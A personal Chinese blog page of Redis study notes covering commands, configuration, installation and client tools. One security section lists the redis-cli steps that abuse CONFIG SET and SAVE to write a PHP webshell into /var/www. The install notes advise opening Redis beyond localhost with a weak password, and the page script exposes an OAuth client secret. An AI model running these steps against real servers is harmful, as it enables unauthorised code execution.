+</tbody></table>
+<h3 id="Redis-发布订阅"><a href="#Redis-发布订阅" class="headerlink" title="Redis 发布订阅"></a>Redis 发布订阅</h3><p><a href="https://www.twle.cn/l/yufei/redis/redis-basic-pub-sub.html">Redis 发布订阅 - Redis 基础教程 - 简单教程，简单编程</a></p>
+<h3 id="Redis-事务"><a href="#Redis-事务" class="headerlink" title="Redis 事务"></a>Redis 事务</h3><h3 id="Redis-Script-脚本-命令"><a href="#Redis-Script-脚本-命令" class="headerlink" title="Redis Script( 脚本 ) 命令"></a>Redis Script( 脚本 ) 命令</h3><h3 id="Redis-连接命令"><a href="#Redis-连接命令" class="headerlink" title="Redis 连接命令"></a>Redis 连接命令</h3><h3 id="Redis-服务器"><a href="#Redis-服务器" class="headerlink" title="Redis 服务器"></a>Redis 服务器</h3><h3 id="Java-使用-Redis"><a href="#Java-使用-Redis" class="headerlink" title="Java 使用 Redis"></a>Java 使用 Redis</h3><h3 id="PHP-和-Redis"><a href="#PHP-和-Redis" class="headerlink" title="PHP 和 Redis"></a>PHP 和 Redis</h3><h3 id="Redis-数据备份与恢复"><a href="#Redis-数据备份与恢复" class="headerlink" title="Redis 数据备份与恢复"></a>Redis 数据备份与恢复</h3><h3 id="Redis-服务安全"><a href="#Redis-服务安全" class="headerlink" title="Redis 服务安全"></a>Redis 服务安全</h3><h3 id="Redis-性能测试"><a href="#Redis-性能测试" class="headerlink" title="Redis 性能测试"></a>Redis 性能测试</h3><h3 id="Redis-客户端连接"><a href="#Redis-客户端连接" class="headerlink" title="Redis 客户端连接"></a>Redis 客户端连接</h3><h3 id="Redis-管道技术"><a href="#Redis-管道技术" class="headerlink" title="Redis 管道技术"></a>Redis 管道技术</h3><h3 id="Redis-分区"><a href="#Redis-分区" class="headerlink" title="Redis 分区"></a>Redis 分区</h3><h3 id="redis安全学习小记"><a href="#redis安全学习小记" class="headerlink" title="redis安全学习小记"></a>redis安全学习小记</h3><p><a href="https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw">redis安全学习小记</a></p>
+<p><strong>REDIS连接命令</strong></p>
+<p>redis-cli -h host -p port</p>
+<p><strong>获取配置</strong></p>
+<p>config get *</p>
+<p><strong>编辑配置</strong></p>
+<p>修改 redis.conf 文件或使用 config set 命令来修改配置</p>
+<p><strong>数据类型</strong></p>
+<p>五种：string list set zset hash</p>
+<p><strong>服务器配置</strong></p>
+<p>用 sed 修改配置（值得学习的装逼技术）：</p>
+<p>sed -i ‘s/daemonize no/daemonize yes/g’ /etc/redis-5.0.8/redis.conf</p>
+<p><strong><em>redis</em>设置密码的两种方法</strong><br><em>redis</em>-<em>cli<em>连上去<br><code>config set requirepass 123456</code><br>或者修改</em>redis</em>.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;# requirepass foobared&#x2F;requirepass 123456&#x2F;g&#39; &#x2F;etc&#x2F;redis&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
+
+<p>第二种方法设置完之后需要重启<em>redis</em>。</p>
+<p>然后再用<em>redis</em>-<em>cli*去连的时候需要先执行 AUTH 命令才可以执行其他命令。<br><code>AUTH 123456</code><br>*redis</em>-<em>cli</em> -a 的参数本质是就是 AUTH 命令</p>
+<p><strong>数据库备份</strong><br>Redis SAVE 命令用于创建当前数据库的备份。常见利用其来写文件达到 getshell 的目的。</p>
+<p>redis-cli -h 127.0.0.1 flushall #清空所有key<br>redis-cli -h 127.0.0.1 config set dir /var/www #设置数据库备份保存的目录<br>redis-cli -h 127.0.0.1 config set dbfilename shell.php #设置数据库备份保存的文件名<br>redis-cli -h 127.0.0.1 set webshell “<?php phpinfo();?>“ #将想写入的内容写进key值<br>redis-cli -h 127.0.0.1 save # 备份</p>
+<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Mac："><a href="#Mac：" class="headerlink" title="Mac："></a>Mac：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">brew install redis</span><br><span class="line"><span class="meta">#</span><span class="bash"> To have launchd start redis now and restart at login:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   brew services start redis</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Or, <span class="keyword">if</span> you don<span class="string">'t want/need a background service you can just run:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   redis-server /usr/<span class="built_in">local</span>/etc/redis.conf</span></span><br><span class="line">brew update;brew services start redis</span><br><span class="line"></span><br><span class="line">cotEdit /usr/local/etc/redis.conf</span><br><span class="line">注释 bind 127.0.0.1</span><br><span class="line">取消注释 requirepass foobare， 并配置密码</span><br><span class="line"></span><br><span class="line">brew services list                </span><br><span class="line"><span class="meta">#</span><span class="bash"> Name          Status  User         Plist</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> elasticsearch stopped</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> redis         started zhangronghui /Users/zhangronghui/Library/LaunchAgents/homebrew.mxcl.redis.plist</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> unbound       stopped</span></span><br><span class="line"></span><br><span class="line">brew services restart redis</span><br><span class="line">pip install iredis</span><br><span class="line">redis-cli/iredis -a redispassword --raw</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux-上"><a href="#Linux-上" class="headerlink" title="Linux 上"></a>Linux 上</h3><p><a href="https://juejin.im/post/5ecc754bf265da770f51f373">centos安装redis - 掘金</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> wget http://download.redis.io/releases/redis-5.0.7.tar.gz</span></span><br><span class="line">rsync -azvhP ~/Downloads/Compressed/redis-5.0.7.tar.gz  root@47.93.53.47:/tmp</span><br><span class="line">cd /tmp</span><br><span class="line">tar xf /tmp/redis-5.0.7.tar.gz</span><br><span class="line">cd redis-5.0.7</span><br><span class="line">make</span><br><span class="line">make PREFIX=/usr/local/redis install</span><br><span class="line"></span><br><span class="line">mkdir /usr/local/redis/etc</span><br><span class="line">cp redis.conf /usr/local/redis/etc</span><br><span class="line">vim /usr/local/redis/etc/redis.conf</span><br><span class="line"></span><br><span class="line">1）配置redis为后台启动：daemonize no  修改为 daemonize yes</span><br><span class="line">2）开启外网访问：bind 127.0.01  注释掉</span><br><span class="line">3）配置密码：requirepass 设置密码</span><br><span class="line"></span><br><span class="line">pip install iredis</span><br><span class="line">iredis --raw</span><br><span class="line"></span><br><span class="line">vim ~/.zshrc</span><br><span class="line">export PATH=/usr/local/redis/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">redis-server /usr/local/redis/etc/redis.conf</span><br><span class="line"></span><br><span class="line">iredis --raw</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="https://i.loli.net/2020/03/12/CXDx73TjfPUGYwL.png" alt="CXDx73TjfPUGYwL" style="zoom:33%;" />
+
+
+
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://github.com/laixintao/iredis">laixintao/iredis: Interactive Redis: A Terminal Client for Redis with AutoCompletion and Syntax Highlighting.</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install iredis</span><br></pre></td></tr></table></figure>
+
+<p>启动 redis-cli 或者更好的替代品 iredis ( pip install iredis )</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iredis -a redispassword --raw # --raw 为了可以查看中文</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://github.com/mylxsw/redis-tui">mylxsw/redis-tui: A Redis Text-based UI client in CLI</a></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1></div><ul class="post-copyright"><li><strong>本文标题：</strong><a href="https://zronghui.github.io/redis/redis.html">redis</a></li><li><strong>本文作者：</strong><a href="https://zronghui.github.io">zronghui</a></li><li><strong>本文链接：</strong><a href="https://zronghui.github.io/redis/redis.html">https://zronghui.github.io/redis/redis.html</a></li><li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li></ul><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 推荐文章</span><br><span>  1.<a class="is-size-6" href="/Leetcode%20weekly%20contest/biweekly-contest-22.html" target="_blank">biweekly-contest-22</a><br></span><span>  2.<a class="is-size-6" href="/leetcode/%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95%E9%87%91%E5%85%B8/%E9%9D%A2%E8%AF%95%E9%A2%98-01-07-%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5.html" target="_blank">面试题 01.07 旋转矩阵</a><br></span><span>  3.<a class="is-size-6" href="/Chrome/chrome-%E6%8F%92%E4%BB%B6.html" target="_blank">chrome 插件</a><br></span><span>  4.<a class="is-size-6" href="/Leetcode%20weekly%20contest/biweekly-contest-23.html" target="_blank">biweekly-contest-23</a><br></span><span>  5.<a class="is-size-6" href="/Leetcode%20weekly%20contest/weekly-contest-180.html" target="_blank">weekly-contest-180</a><br></span></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><div class="social-share"></div><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button is-info donate"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://i.loli.net/2020/03/05/MeFCknt1wipKvRA.png" alt="支付宝"></span></a><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://i.loli.net/2020/03/05/MVJrxG3gO6qHSiz.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/todo/tools-to-use.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">tools to use</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/todo/%E5%BE%85%E6%80%BB%E7%BB%93.html"><span class="level-item">待总结</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.6.2/gitalk.min.js"></script><script>var gitalk = new Gitalk({
+            id: 'b88ec4783530bc0baaacbe1bc331ceea',
+            repo: 'blog_comment',
+            owner: 'zronghui',
+            clientID: 'f1c7f9da01111d2e7163',
+            clientSecret: '3aaaf709bd8edda1f4c57484cceba5fad5218978',
+            admin: ["zronghui"],
+            createIssueManually: false,
+            distractionFreeMode: false,
+            perPage: 20,
+            pagerDirection: 'last',
+            
+            
+            enableHotKey: true,
+            isLocked: false
+        })
+        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="is-flex" id="toc-item-学习" href="#学习"><span>学习</span></a><ul class="menu-list"><ul class="menu-list"><li><a class="is-flex" id="toc-item-redis-七种数据类型" href="#redis-七种数据类型"><span>redis 七种数据类型</span></a></li><li><a class="is-flex" id="toc-item-redis-cli" href="#redis-cli"><span>redis-cli</span></a></li><li><a class="is-flex" id="toc-item-Redis-键-key-命令" href="#Redis-键-key-命令"><span>Redis 键(key) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-字符串-String-命令" href="#Redis-字符串-String-命令"><span>Redis 字符串(String) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-哈希-Hash-命令" href="#Redis-哈希-Hash-命令"><span>Redis 哈希(Hash) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-列表-List-命令" href="#Redis-列表-List-命令"><span>Redis 列表(List) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-集合-Set-命令" href="#Redis-集合-Set-命令"><span>Redis 集合(Set) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-有序集合-sorted-set-命令" href="#Redis-有序集合-sorted-set-命令"><span>Redis 有序集合(sorted set) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-HyperLogLog-命令" href="#Redis-HyperLogLog-命令"><span>Redis HyperLogLog 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-发布订阅" href="#Redis-发布订阅"><span>Redis 发布订阅</span></a></li><li><a class="is-flex" id="toc-item-Redis-事务" href="#Redis-事务"><span>Redis 事务</span></a></li><li><a class="is-flex" id="toc-item-Redis-Script-脚本-命令" href="#Redis-Script-脚本-命令"><span>Redis Script( 脚本 ) 命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-连接命令" href="#Redis-连接命令"><span>Redis 连接命令</span></a></li><li><a class="is-flex" id="toc-item-Redis-服务器" href="#Redis-服务器"><span>Redis 服务器</span></a></li><li><a class="is-flex" id="toc-item-Java-使用-Redis" href="#Java-使用-Redis"><span>Java 使用 Redis</span></a></li><li><a class="is-flex" id="toc-item-PHP-和-Redis" href="#PHP-和-Redis"><span>PHP 和 Redis</span></a></li><li><a class="is-flex" id="toc-item-Redis-数据备份与恢复" href="#Redis-数据备份与恢复"><span>Redis 数据备份与恢复</span></a></li><li><a class="is-flex" id="toc-item-Redis-服务安全" href="#Redis-服务安全"><span>Redis 服务安全</span></a></li><li><a class="is-flex" id="toc-item-Redis-性能测试" href="#Redis-性能测试"><span>Redis 性能测试</span></a></li><li><a class="is-flex" id="toc-item-Redis-客户端连接" href="#Redis-客户端连接"><span>Redis 客户端连接</span></a></li><li><a class="is-flex" id="toc-item-Redis-管道技术" href="#Redis-管道技术"><span>Redis 管道技术</span></a></li><li><a class="is-flex" id="toc-item-Redis-分区" href="#Redis-分区"><span>Redis 分区</span></a></li><li><a class="is-flex" id="toc-item-redis安全学习小记" href="#redis安全学习小记"><span>redis安全学习小记</span></a></li></ul></ul></li><li><a class="is-flex" id="toc-item-实践" href="#实践"><span>实践</span></a><ul class="menu-list"><li><a class="is-flex" id="toc-item-安装" href="#安装"><span>安装</span></a><ul class="menu-list"><li><a class="is-flex" id="toc-item-Mac：" href="#Mac："><span>Mac：</span></a></li><li><a class="is-flex" id="toc-item-Linux-上" href="#Linux-上"><span>Linux 上</span></a></li></ul></li></ul></li><li><a class="is-flex" id="toc-item-工具" href="#工具"><span>工具</span></a></li><li><a class="is-flex" id="toc-item-其他" href="#其他"><span>其他</span></a></li></ul></div></div><script type="text/javascript" async>
+        $(document).ready(function () { //参考自 https://github.com/ppoffice/hexo-theme-icarus/pull/616/files
+            var observerTopMargin;
+            var scrollObserver;
+            var headerElems = $(".headerlink");
+            var activeTocItem;
+        
+            function initIntersectionObserver(docHeight) {
+                observerTopMargin = docHeight;
+                scrollObserver = new IntersectionObserver(scrollCallBack,
+                    {
+                        root: null,  // viewpoint
+                        rootMargin: docHeight + "px 0px -80% 0px"  // cover top 30% of viewport to the top of document
+                    })
+            }
+        
+            function scrollCallBack(entries, observer) {
+                if ($(window).scrollTop() > observerTopMargin * 0.7) { 
+                    // User somehow scroll to 70% of observerTopMargin (which is inited as 200% document height)
+                    // Observer top margin need to extend to cover all the space to the top of the document
+                    initIntersectionObserver(observerTopMargin * 2)
+                    observer.disconnect();
+                    return;
+                }
+                let toActive;
+                if (entries[0].intersectionRatio == 1) {  // enter viewed area
+                    let entry = entries.reduce((u, v) => (u.target.toc_id > v.target.toc_id ? u : v));  // get the lowest item
+                    toActive = $("#toc-item-" + $(entry.target).attr("href").substr(1));
+                } else {
+                    let entry = entries.reduce((u, v) => (u.target.toc_id < v.target.toc_id ? u : v));  // get the highest item
+                    let idx = Math.max(entry.target.toc_id - 1, 0);
+                    toActive = $("#toc-item-" + $(headerElems[idx]).attr("href").substr(1));
+                }
+                if (activeTocItem) activeTocItem.removeClass("is-current");
+                activeTocItem = toActive
+                activeTocItem.addClass("is-current");
+            }
+        
+            initIntersectionObserver($(document).height() * 2);
+            headerElems.each(function (index, obj) {
+                obj.toc_id = index;
+                scrollObserver.observe(obj);
+            })
+        });</script></div><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="https://i.loli.net/2020/02/27/giKJ3UbFhv69o7T.jpg" alt="zronghui"></figure><p class="title is-size-4 is-block line-height-inherit">zronghui</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">582</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">49</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">48</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/zronghui" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/zronghui"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
+                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
+                                if(data){
+                                    $('#hitokoto').html("");
+                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
+                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
+                                }});}
+                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-01T14:15:50.000Z">2020-12-01</time></p><p class="title is-6"><a class="link-muted" href="/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8AMySQL8-cookbook%E3%80%8B-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html">《MySQL8 cookbook》 阅读笔记</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-29T14:16:28.000Z">2020-11-29</time></p><p class="title is-6"><a class="link-muted" href="/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8ARedis-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B.html">《Redis 设计与实现》</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-29T14:16:13.000Z">2020-11-29</time></p><p class="title is-6"><a class="link-muted" href="/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8AMongoDB-%E5%AE%9E%E6%88%98%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html">《MongoDB 实战》阅读笔记</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-29T14:15:56.000Z">2020-11-29</time></p><p class="title is-6"><a class="link-muted" href="/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8ALinux-Shell-%E8%84%9A%E6%9C%AC%E6%94%BB%E7%95%A5%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0.html">《Linux Shell 脚本攻略》阅读笔记</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-29T07:52:12.000Z">2020-11-29</time></p><p class="title is-6"><a class="link-muted" href="/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4-MYSQL45%E8%AE%B2-%E7%AC%94%E8%AE%B0.html">极客时间-MYSQL45讲-笔记</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Chrome/"><span class="level-start"><span class="level-item">Chrome</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Leetcode-weekly-contest/"><span class="level-start"><span class="level-item">Leetcode weekly contest</span></span><span class="level-end"><span class="level-item tag">41</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Linux/"><span class="level-start"><span class="level-item">Linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">18</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/blockchain/"><span class="level-start"><span class="level-item">blockchain</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/docker-k8s/"><span class="level-start"><span class="level-item">docker k8s</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/frontEnd/"><span class="level-start"><span class="level-item">frontEnd</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/go/"><span class="level-start"><span class="level-item">go</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/java/"><span class="level-start"><span class="level-item">java</span></span><span class="level-end"><span class="level-item tag">40</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/java/Collections/"><span class="level-start"><span class="level-item">Collections</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li></ul></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/12/"><span class="level-start"><span class="level-item">December 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/10/"><span class="level-start"><span class="level-item">October 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">September 2020</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">30</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Array/"><span class="tag">Array</span><span class="tag is-grey-lightest">35</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tree/"><span class="tag">Tree</span><span class="tag is-grey-lightest">34</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dynamic-Programming/"><span class="tag">Dynamic Programming</span><span class="tag is-grey-lightest">21</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Binary-Search/"><span class="tag">Binary Search</span><span class="tag is-grey-lightest">20</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Depth-first-Search/"><span class="tag">Depth-first Search</span><span class="tag is-grey-lightest">19</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hash-Table/"><span class="tag">Hash Table</span><span class="tag is-grey-lightest">19</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag is-grey-lightest">16</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Math/"><span class="tag">Math</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Two-Pointers/"><span class="tag">Two Pointers</span><span class="tag is-grey-lightest">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/String/"><span class="tag">String</span><span class="tag is-grey-lightest">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linked-List/"><span class="tag">Linked List</span><span class="tag is-grey-lightest">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Stack/"><span class="tag">Stack</span><span class="tag is-grey-lightest">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Backtracking/"><span class="tag">Backtracking</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Breadth-first-Search/"><span class="tag">Breadth-first Search</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap/"><span class="tag">Heap</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tricks/"><span class="tag">tricks</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Design/"><span class="tag">Design</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bit-Manipulation/"><span class="tag">Bit Manipulation</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Sort/"><span class="tag">Sort</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Divide-and-Conquer/"><span class="tag">Divide and Conquer</span><span class="tag is-grey-lightest">5</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">查看全部&gt;&gt;</span></a></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=zronghui&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="zronghui" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="订阅"></div></div><p class="help">输入邮箱开始订阅，更博后邮件通知！</p></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://www.wntool.com/logo/image.php?output=png?fsize=35&amp;font=Snow.ttf&amp;text=zronghui&amp;mirror=No&amp;color=9933FF&amp;vcolor=3333FF&amp;bgcolor=FFFFFF&amp;alpha=yes&amp;output=png&amp;spacing=5&amp;shadow=no&amp;transparent=yes&amp;icon=no&amp;iconic=&amp;top_spacing=5&amp;left_spacing=6&amp;icon_size=48" alt="zronghui的博客" height="28"></a><p class="size-small"><span>&copy; 2020 zronghui</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif" target="_blank">removeif</a> <br>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br>    